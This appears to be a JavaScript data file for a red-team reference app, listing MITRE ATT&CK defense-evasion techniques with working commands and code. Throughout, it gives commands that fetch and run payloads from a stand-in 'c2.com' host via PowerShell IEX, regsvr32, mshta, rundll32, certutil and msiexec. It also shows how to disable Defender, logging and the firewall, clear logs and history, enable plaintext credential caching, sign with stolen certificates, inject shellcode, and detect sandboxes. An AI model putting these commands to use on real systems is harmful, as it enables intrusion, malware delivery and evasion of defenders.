export const defenseEvasionTechniques = [
  {
    id: "T1140",
    name: "Deobfuscate/Decode Files",
    summary: "base64 decode • XOR decryption • packing",
    description: "Deobfuscating or decrypting malware payloads during execution to hide malicious code from static analysis.",
    tags: ["T1140", "obfuscation", "base64", "XOR", "packing"],
    steps: [
      { type: "comment", content: "# Base64 encoded payload in PowerShell" },
      { type: "code", content: "$encoded = 'SUVYKElXUiBodHRwOi8vYzIuY29tL3AucHMxKQ=='\n$decoded = [System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String($encoded))\nIEX $decoded" },
      { type: "comment", content: "# XOR obfuscation of shellcode" },
      { type: "code", content: "key = 0x42\nshellcode = [b ^ key for b in original_shellcode]\n# XOR decrypt at runtime before executing\n" },
      { type: "comment", content: "# Use Invoke-Obfuscation to obfuscate PowerShell" },
      { type: "cmd", content: "Import-Module Invoke-Obfuscation\nSet-ScriptBlock 'IEX(IWR http://c2.com/p.ps1)'\nOut-ObfuscatedStringCommand" },
    ]
  },
  {
    id: "T1562",
    name: "Impair Defenses",
    summary: "disable AV • disable logging • tamper Sysmon",
    description: "Disabling or tampering with security monitoring tools, antivirus, firewalls, and logging mechanisms.",
    tags: ["T1562", "disable AV", "disable logging", "tamper Sysmon", "firewall"],
    steps: [
      { type: "comment", content: "# T1562.001 - Disable Windows Defender" },
      { type: "cmd", content: "Set-MpPreference -DisableRealtimeMonitoring $true\nSet-MpPreference -DisableIOAVProtection $true\nreg add \"HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows Defender\" /v DisableAntiSpyware /t REG_DWORD /d 1 /f" },
      { type: "comment", content: "# T1562.002 - Disable Windows Event Logging" },
      { type: "cmd", content: "auditpol /set /category:* /success:disable /failure:disable\nwevtutil cl System; wevtutil cl Security; wevtutil cl Application" },
      { type: "comment", content: "# T1562.001 - Disable firewall" },
      { type: "cmd", content: "netsh advfirewall set allprofiles state off\nufw disable  # Linux" },
      { type: "comment", content: "# T1562.009 - Add AV exclusion path" },
      { type: "cmd", content: "Add-MpPreference -ExclusionPath 'C:\\Users\\Public\\'\nAdd-MpPreference -ExclusionProcess 'powershell.exe'" },
    ]
  },
  {
    id: "T1070",
    name: "Indicator Removal",
    summary: "clear logs • timestomping • file deletion",
    description: "Removing or modifying artifacts left on systems, including clearing event logs, deleting files, and timestomping.",
    tags: ["T1070", "clear logs", "timestomping", "file deletion", "cover tracks"],
    steps: [
      { type: "comment", content: "# T1070.001 - Clear Windows event logs" },
      { type: "cmd", content: "wevtutil cl System\nwevtutil cl Security  \nwevtutil cl Application\nwevtutil el | ForEach-Object {wevtutil cl $_}" },
      { type: "comment", content: "# T1070.006 - Timestomping - modify file timestamps" },
      { type: "code", content: "# Python timestomping\nimport os, datetime\nref_time = os.stat('/bin/ls').st_mtime\nos.utime('malware.exe', (ref_time, ref_time))" },
      { type: "comment", content: "# T1070.003 - Clear bash history" },
      { type: "cmd", content: "history -c && history -w\nunset HISTFILE\nrm -f ~/.bash_history\nln -sf /dev/null ~/.bash_history" },
      { type: "comment", content: "# T1070.004 - Secure delete tools" },
      { type: "cmd", content: "sdelete64.exe -p 3 malware.exe  # Windows\nsrm -v malware_file  # Linux/macOS" },
    ]
  },
  {
    id: "T1036",
    name: "Masquerading",
    summary: "rename binaries • code signing • double extension",
    description: "Manipulating features of artifacts to make them appear legitimate or benign, including renaming files and fake code signing.",
    tags: ["T1036", "masquerading", "rename", "double extension", "code signing"],
    steps: [
      { type: "comment", content: "# T1036.004 - Rename malware to look like system process" },
      { type: "cmd", content: "copy C:\\Users\\Public\\malware.exe C:\\Windows\\Temp\\svchost.exe\n# Name after common processes: explorer.exe, lsass.exe, csrss.exe" },
      { type: "comment", content: "# T1036.007 - Double extension trick" },
      { type: "cmd", content: "# Create file: Invoice_Q4.pdf.exe\n# Set exe icon to PDF icon to fool users" },
      { type: "comment", content: "# T1036.001 - Code sign with stolen/self-signed cert" },
      { type: "cmd", content: "signtool sign /f stolen_cert.pfx /p password /fd sha256 /tr http://timestamp.digicert.com malware.exe" },
    ]
  },
  {
    id: "T1112",
    name: "Modify Registry",
    summary: "registry modification • disable security controls",
    description: "Modifying Windows registry keys to hide configurations, disable security controls, or establish persistence.",
    tags: ["T1112", "registry", "security controls", "Windows"],
    steps: [
      { type: "comment", content: "# Disable UAC via registry" },
      { type: "cmd", content: "reg add \"HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System\" /v EnableLUA /t REG_DWORD /d 0 /f" },
      { type: "comment", content: "# Enable WDigest for LSASS plaintext credential caching" },
      { type: "cmd", content: "reg add \"HKLM\\SYSTEM\\CurrentControlSet\\Control\\SecurityProviders\\WDigest\" /v UseLogonCredential /t REG_DWORD /d 1 /f" },
      { type: "comment", content: "# Disable LSA protection" },
      { type: "cmd", content: "reg add \"HKLM\\SYSTEM\\CurrentControlSet\\Control\\Lsa\" /v RunAsPPL /t REG_DWORD /d 0 /f" },
    ]
  },
  {
    id: "T1055",
    name: "Process Injection (Evasion)",
    summary: "shellcode injection • early bird • APC injection",
    description: "Using process injection to hide malicious code within legitimate processes and evade endpoint detection.",
    tags: ["T1055", "process injection", "early bird APC", "shellcode"],
    steps: [
      { type: "comment", content: "# T1055.004 - Asynchronous Procedure Call (APC) injection" },
      { type: "code", content: "// Early Bird APC injection\nHANDLE hProc = NULL, hThread = NULL;\nCREATEPROCESSA(NULL, \"C:\\\\Windows\\\\System32\\\\notepad.exe\", NULL, NULL, FALSE,\n    CREATE_SUSPENDED, NULL, NULL, &si, &pi);\n// Queue APC to main thread before it runs\nVirtualAllocEx(pi.hProcess, ...);\nWriteProcessMemory(pi.hProcess, ...);\nQueueUserAPC((PAPCFUNC)shellcodeAddr, pi.hThread, NULL);\nResumeThread(pi.hThread);" },
      { type: "comment", content: "# T1055.013 - Process Doppelgänging (transacted hollowing)" },
      { type: "cmd", content: "# Use legitimate NTFS transaction to write malicious code\n# Rollback transaction but execute already-mapped code" },
    ]
  },
  {
    id: "T1027",
    name: "Obfuscated Files or Information",
    summary: "encoding • encryption • steganography • packing",
    description: "Encrypting, encoding, or otherwise obfuscating files and information to hide malicious artifacts from analysis tools.",
    tags: ["T1027", "obfuscation", "encoding", "encryption", "steganography"],
    steps: [
      { type: "comment", content: "# T1027.002 - Pack malware to hide from signature detection" },
      { type: "cmd", content: "upx --best --lzma malware.exe -o packed.exe\n# Or use custom packer/crypter for AV evasion" },
      { type: "comment", content: "# T1027.003 - Steganography - hide payload in image" },
      { type: "cmd", content: "steghide embed -cf image.jpg -ef payload.exe -p password\nsteghide extract -sf image.jpg -p password" },
      { type: "comment", content: "# T1027.009 - Embed payload in legitimate Office document" },
      { type: "cmd", content: "# Use DKMC to embed shellcode in image files bypassing detection" },
      { type: "comment", content: "# T1027.004 - Compile payload on target to avoid pre-compiled artifacts" },
      { type: "cmd", content: "# Transfer source code only, compile on target:\npowershell Add-Type -TypeDefinition (IWR http://c2.com/payload.cs).Content" },
    ]
  },
  {
    id: "T1218",
    name: "System Binary Proxy Execution",
    summary: "LOLBAS • regsvr32 • mshta • certutil • rundll32",
    description: "Using legitimate system binaries (Living off the Land) to proxy execution of malicious code and bypass application controls.",
    tags: ["T1218", "LOLBAS", "regsvr32", "mshta", "certutil", "rundll32"],
    steps: [
      { type: "comment", content: "# T1218.010 - regsvr32 COM scriptlet execution" },
      { type: "cmd", content: "regsvr32.exe /s /u /i:http://c2.com/payload.sct scrobj.dll" },
      { type: "comment", content: "# T1218.005 - mshta execution" },
      { type: "cmd", content: "mshta.exe http://c2.com/payload.hta\nmshta.exe vbscript:Execute(\"MsgBox 0:close\")" },
      { type: "comment", content: "# T1218.011 - rundll32 for arbitrary code execution" },
      { type: "cmd", content: "rundll32.exe javascript:\"\\..\\mshtml,RunHTMLApplication \";document.write();new%20ActiveXObject(\"WScript.Shell\").Run(\"powershell -nop IEX(IWR http://c2.com/p.ps1)\")" },
      { type: "comment", content: "# T1218.003 - certutil for file download and decode" },
      { type: "cmd", content: "certutil -urlcache -split -f http://c2.com/payload.b64 payload.b64 && certutil -decode payload.b64 payload.exe" },
      { type: "comment", content: "# T1218.007 - msiexec for remote package execution" },
      { type: "cmd", content: "msiexec /q /i http://c2.com/malicious.msi" },
    ]
  },
  {
    id: "T1553",
    name: "Subvert Trust Controls",
    summary: "code signing bypass • rootkit • UEFI implant",
    description: "Subverting trust mechanisms including digital signatures, code integrity, and boot controls.",
    tags: ["T1553", "code signing", "UEFI", "rootkit", "trust bypass"],
    steps: [
      { type: "comment", content: "# T1553.002 - Code signing with stolen certificate" },
      { type: "cmd", content: "signtool sign /f legitimate_stolen.pfx /p certpassword /fd sha256 malware.exe" },
      { type: "comment", content: "# T1553.004 - Install root CA to trust malicious TLS certs" },
      { type: "cmd", content: "certutil -addstore Root malicious_ca.cer\n# Linux:\ncertutil -d sql:$HOME/.pki/nssdb -A -t 'C,,' -n 'malicious-ca' -i malicious_ca.crt" },
      { type: "comment", content: "# T1553.006 - Code signing policy bypass via Catalog file" },
      { type: "cmd", content: "# Create catalog for unsigned binary:\ninfcreate.exe /u malware.inf\nsigntool addstore /f catalog.cat" },
    ]
  },
  {
    id: "T1497",
    name: "Virtualization/Sandbox Evasion",
    summary: "sandbox detection • delay execution • environment checks",
    description: "Detecting and evading virtualized environments, sandboxes, and analysis systems to avoid detection.",
    tags: ["T1497", "sandbox evasion", "VM detection", "environment checks"],
    steps: [
      { type: "comment", content: "# T1497.001 - Check for sandbox/VM artifacts" },
      { type: "code", content: "# Check common sandbox indicators\nimport os, ctypes, time\n\n# Check username/hostname\nif os.getenv('USERNAME', '').lower() in ['sandbox', 'malware', 'virus', 'test']:\n    exit(0)\n\n# Check for VM artifacts\nvbox = os.path.exists('C:\\\\Windows\\\\system32\\\\drivers\\\\VBoxGuest.sys')\nvmware = os.path.exists('C:\\\\Windows\\\\system32\\\\drivers\\\\vmhgfs.sys')\nif vbox or vmware:\n    exit(0)\n\n# Sleep to bypass time-accelerated sandboxes\ntime.sleep(300)" },
      { type: "comment", content: "# T1497.002 - Check system resources to detect sandbox" },
      { type: "code", content: "// C - Check RAM size (sandboxes often have limited RAM)\nGLOBALMEMORYSTATUSEX ms;\nms.dwLength = sizeof(ms);\nGlobalMemoryStatusEx(&ms);\nif (ms.ullTotalPhys < 4ULL * 1024 * 1024 * 1024) {\n    // Likely a sandbox - exit\n    ExitProcess(0);\n}" },
    ]
  },
];